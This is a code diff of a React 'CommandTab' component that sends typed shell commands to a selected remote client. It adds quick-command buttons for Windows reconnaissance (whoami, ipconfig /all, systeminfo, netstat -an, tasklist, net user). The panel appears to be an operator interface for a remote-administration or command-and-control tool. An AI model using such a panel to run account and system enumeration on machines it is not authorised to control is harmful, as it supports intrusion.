@@ -1,11 +1,14 @@
-function MyCommandTab({ selectedClient, clients, onClientSelect, setStatus, refreshMessages }) {
+import React from 'react';
+import { apiService } from '../services/api.js';
+
+function CommandTab({ selectedClient, clients, onClientSelect, setStatus, refreshMessages }) {
     const [command, setCommand] = React.useState('');
 
     const sendCommand = async () => {
         if (!selectedClient || !command) return;
         
         try {
-            await apiService.mySendCommand(selectedClient, command);
+            await apiService.sendCommand(selectedClient, command);
             setStatus('✅ Command sent - waiting for response...');
             setCommand('');
             refreshMessages();
@@ -15,13 +18,18 @@ function MyCommandTab({ selectedClient, clients, onClientSelect, setStatus, refr
     };
 
     const quickCommands = [
-        { label: 'systeminfo', command: 'systeminfo' }//,
-        // { label: 'net user', command: 'net user' }
+        { label: 'whoami', command: 'whoami' },
+        { label: 'ipconfig', command: 'ipconfig /all' },
+        { label: 'systeminfo', command: 'systeminfo' },
+        { label: 'dir C:\\', command: 'dir C:\\' },
+        { label: 'netstat', command: 'netstat -an' },
+        { label: 'tasklist', command: 'tasklist' },
+        { label: 'net user', command: 'net user' }
     ];
 
     return (
         <div>
-            <h3>📝 My Execute Commands:</h3>
+            <h3>📝 Execute Commands:</h3>
             <select 
                 value={selectedClient} 
                 onChange={(e) => onClientSelect(e.target.value)}
@@ -56,3 +64,4 @@ function MyCommandTab({ selectedClient, clients, onClientSelect, setStatus, refr
         </div>
     );
 }
+export default CommandTab;
